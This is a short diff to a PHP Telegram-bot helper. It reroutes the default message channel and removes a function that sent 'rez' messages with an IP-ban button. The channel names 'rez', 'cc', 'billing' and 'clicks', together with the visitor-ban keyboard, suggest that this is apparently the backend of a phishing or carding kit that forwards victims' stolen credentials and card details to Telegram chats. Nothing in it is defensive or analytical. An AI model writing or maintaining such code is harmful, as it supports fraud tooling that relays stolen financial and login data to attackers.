@@ -328,7 +328,7 @@ function telegram_chat_id(array $config, string $channel): string
         'clicks' => telegram_config_chat_id($config, 'chat_id_clicks'),
         'billing' => telegram_config_chat_id($config, 'chat_id_billing'),
         'cc' => telegram_config_chat_id($config, 'chat_id_cc'),
-        default => telegram_config_chat_id($config, 'chat_id_rez'),
+        default => '',
     };
 }
 
@@ -505,7 +505,7 @@ function telegram_ban_ip_keyboard(string $ip): ?array
     ];
 }
 
-function send_telegram_message(string $text, string $channel = 'rez', ?array $replyMarkup = null): bool
+function send_telegram_message(string $text, string $channel = 'clicks', ?array $replyMarkup = null): bool
 {
     $config = telegram_config();
     if ($config === null || empty($config['enabled'])) {
@@ -531,11 +531,6 @@ function send_telegram_message(string $text, string $channel = 'rez', ?array $re
     $json = telegram_api_request('sendMessage', $params);
 
     return is_array($json) && !empty($json['ok']);
-}
-
-function send_telegram_rez_with_ban(string $text, string $ip): bool
-{
-    return send_telegram_message($text, 'rez', telegram_ban_ip_keyboard($ip));
 }
 
 function telegram_answer_callback(string $callbackQueryId, string $text, bool $showAlert = false): bool
